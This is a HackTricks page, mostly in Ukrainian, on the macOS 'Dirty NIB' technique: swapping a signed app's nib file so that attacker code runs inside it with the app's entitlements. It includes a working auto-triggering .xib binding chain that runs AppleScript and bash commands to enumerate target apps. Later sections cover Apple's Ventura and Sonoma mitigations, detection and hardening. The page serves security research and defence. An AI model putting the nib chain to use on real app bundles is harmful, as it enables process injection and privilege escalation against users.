# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB означає зловживання файлами Interface Builder (.xib/.nib) усередині підписаного bundle macOS app для виконання контрольованої attacker logic у процесі target, успадковуючи таким чином його entitlements і TCC permissions. Цю техніку спочатку задокументував xpn (MDSec), а згодом узагальнив і значно розширив Sector7, який також описав mitigation від Apple у macOS 13 Ventura та macOS 14 Sonoma.<sup>[[1]](#references)[[2]](#references)</sup> Довідкову інформацію та детальний розбір див. у references наприкінці.

> TL;DR
> • До macOS 13 Ventura: заміна MainMenu.nib bundle (або іншого nib, який завантажується під час запуску) могла надійно забезпечити process injection і часто privilege escalation.
> • Починаючи з macOS 13 (Ventura), із покращеннями в macOS 14 (Sonoma): deep verification під час першого запуску, bundle protection, Launch Constraints і новий TCC permission “App Management” значною мірою запобігають tampering із nib після запуску з боку unrelated apps. Атаки все ще можуть бути можливими в окремих випадках (наприклад, same-developer tooling, яке змінює власні apps, або terminals, яким користувач надав App Management/Full Disk Access).

## Що таке NIB/XIB files

Файли Nib (скорочення від NeXT Interface Builder) — це серіалізовані графи UI-об’єктів, які використовують AppKit apps. Сучасний Xcode зберігає редаговані XML .xib files, які під час build компілюються у .nib. Типовий app завантажує свій main UI через `NSApplicationMain()`, яка читає ключ `NSMainNibFile` з Info.plist app і під час runtime створює екземпляри об’єктного графа.

Ключові моменти, які роблять атаку можливою:
- NIB loading створює екземпляри довільних Objective‑C classes без необхідності відповідати NSSecureCoding (nib loader від Apple використовує `init`/`initWithFrame:`, якщо `initWithCoder:` недоступний).
- Cocoa Bindings можна зловживати для виклику methods під час створення nibs, зокрема ланцюжків викликів, які не потребують взаємодії з користувачем.


## Процес Dirty NIB injection (погляд attacker)

Класичний flow до Ventura:
1) Створіть malicious .xib
- Додайте об’єкт `NSAppleScript` (або інші “gadget” classes, наприклад `NSTask`).
- Додайте `NSTextField`, title якого містить payload (наприклад, AppleScript або command arguments).
- Додайте один або кілька об’єктів `NSMenuItem`, з’єднаних через bindings для виклику methods у target object.

2) Автоматичний trigger без кліків користувача
- Використайте bindings, щоб встановити target/selector menu item, а потім викликати private method `_corePerformAction`, завдяки чому action автоматично спрацьовує під час завантаження nib. Це усуває необхідність натискання користувачем кнопки.

Мінімальний приклад auto-trigger chain усередині .xib (скорочено для ясності):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
Це забезпечує довільне виконання AppleScript у цільовому процесі під час завантаження nib.<sup>[[1]](#references)</sup> Розширені ланцюжки можуть:
- Створювати довільні класи AppKit (наприклад, `NSTask`) і викликати методи без аргументів, як-от `-launch`.
- Викликати довільні selectors з аргументами-об’єктами за допомогою описаного вище binding trick.
- Завантажувати AppleScriptObjC.framework для bridge до Objective-C і навіть викликати вибрані C APIs.
- У старіших системах, де все ще присутній Python.framework, bridge до Python, а потім використовувати `ctypes` для виклику довільних C functions (дослідження Sector7).<sup>[[2]](#references)</sup>

3) Замініть nib застосунку
- Скопіюйте target.app у доступне для запису розташування, замініть, наприклад, `Contents/Resources/MainMenu.nib` на malicious nib і запустіть target.app. До Ventura після одноразової перевірки Gatekeeper під час наступних запусків виконувалися лише поверхневі перевірки підпису, тому ресурси, що не є executable (наприклад, .nib), повторно не перевірялися.

Приклад AppleScript payload для видимого тесту:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Сучасні засоби захисту macOS (Ventura/Monterey/Sonoma/Sequoia)

Apple запровадила кілька системних механізмів захисту, які суттєво знижують життєздатність Dirty NIB у сучасних версіях macOS:<sup>[[2]](#references)</sup>
- Глибока перевірка під час першого запуску та захист bundle (macOS 13 Ventura)
- Під час першого запуску будь-якого застосунку (з quarantine або без нього) виконується глибока перевірка підпису всіх ресурсів bundle. Після цього bundle стає захищеним: лише застосунки від того самого розробника (або застосунки, яким це явно дозволено) можуть змінювати його вміст. Іншим застосункам потрібен новий дозвіл TCC “App Management”, щоб записувати дані до bundle іншого застосунку.
- Launch Constraints (macOS 13 Ventura)
- Системні застосунки та застосунки з комплекту Apple не можна скопіювати в інше місце й запустити; це унеможливлює підхід “скопіювати до /tmp, внести зміни, запустити” для застосунків ОС.
- Покращення в macOS 14 Sonoma
- Apple посилила App Management і виправила відомі bypass (наприклад, CVE‑2023‑40450), про які зазначала Sector7. Python.framework було видалено раніше (у macOS 12.3), що зламало деякі ланцюжки privilege-escalation.
- Зміни Gatekeeper/Quarantine
- Для ширшого обговорення змін Gatekeeper, provenance та assessment, які вплинули на цю техніку, див. сторінку, на яку наведено посилання нижче.

> Практичний наслідок
> • У Ventura+ зазвичай неможливо змінити .nib стороннього застосунку, якщо ваш процес не має App Management або не підписаний тим самим Team ID, що й цільовий застосунок (наприклад, developer tooling).
> • Надання App Management або Full Disk Access shell/терміналам фактично знову відкриває цю поверхню атаки для всього, що може виконувати code у контексті такого термінала.


### Робота з Launch Constraints

Launch Constraints блокують запуск багатьох застосунків Apple з нестандартних місць, починаючи з Ventura. Якщо ви покладалися на workflow до Ventura, наприклад копіювали застосунок Apple до тимчасової директорії, змінювали `MainMenu.nib` і запускали його, очікуйте, що це не працюватиме в >= 13.0.


## Перелік цілей і nib (корисно для досліджень / legacy systems)

- Знайдіть застосунки, чий UI керується через nib:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- Знайдіть потенційні ресурси nib у bundle:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Ретельно перевіряйте підписи коду (перевірка завершиться невдало, якщо ви змінили ресурси й не підписали їх повторно):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> Примітка: У сучасній macOS вам також завадять захист bundle/TCC під час спроби запису до bundle іншого застосунку без належної авторизації.


## Поради щодо виявлення та DFIR

- Моніторинг цілісності файлів у ресурсах bundle
- Слідкуйте за змінами mtime/ctime для `Contents/Resources/*.nib` та інших невиконуваних ресурсів у встановлених застосунках.
- Unified logs і поведінка процесів
- Відстежуйте неочікуване виконання AppleScript усередині GUI-застосунків і процеси, що завантажують AppleScriptObjC або Python.framework. Приклад:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Проактивні перевірки
- Періодично запускайте `codesign --verify --deep` для критичних застосунків, щоб переконатися, що ресурси залишаються незмінними.
- Контекст привілеїв
- Перевіряйте, хто або що має TCC-дозвіл “App Management” або Full Disk Access (особливо термінали та агенти керування). Вилучення цих дозволів із shell загального призначення запобігає простому повторному ввімкненню втручання на кшталт Dirty NIB.


## Посилення захисту (для розробників і захисників)

- Надавайте перевагу програмному UI або обмежуйте те, що створюється з nib-файлів. Уникайте додавання потужних класів (наприклад, `NSTask`) до графів nib і прив’язок, які опосередковано викликають селектори довільних об’єктів.
- Використовуйте hardened runtime з Library Validation (це вже стандарт для сучасних застосунків). Хоча сам по собі він не зупиняє ін’єкцію в nib, він блокує просте завантаження native code і змушує атакувальників використовувати лише scripting payloads.
- Не запитуйте й не використовуйте широкі дозволи App Management у загальнодоступних інструментах. Якщо MDM потребує App Management, ізолюйте цей контекст від shell, керованих користувачем.
- Регулярно перевіряйте цілісність bundle вашого застосунку, а механізми оновлення мають самостійно відновлювати ресурси bundle.


## Додаткові матеріали в HackTricks

Дізнайтеся більше про Gatekeeper, quarantine та зміни provenance, які впливають на цю техніку:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## Посилання

- [1] [xpn – DirtyNIB (оригінальний опис із прикладом на Pages)](https://blog.xpnsec.com/dirtynib/)
- [2] [Sector7 – Виведення process injection у view: експлуатація всіх macOS-застосунків за допомогою nib-файлів (5 квітня 2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)

{{#include ../../../banners/hacktricks-training.md}}
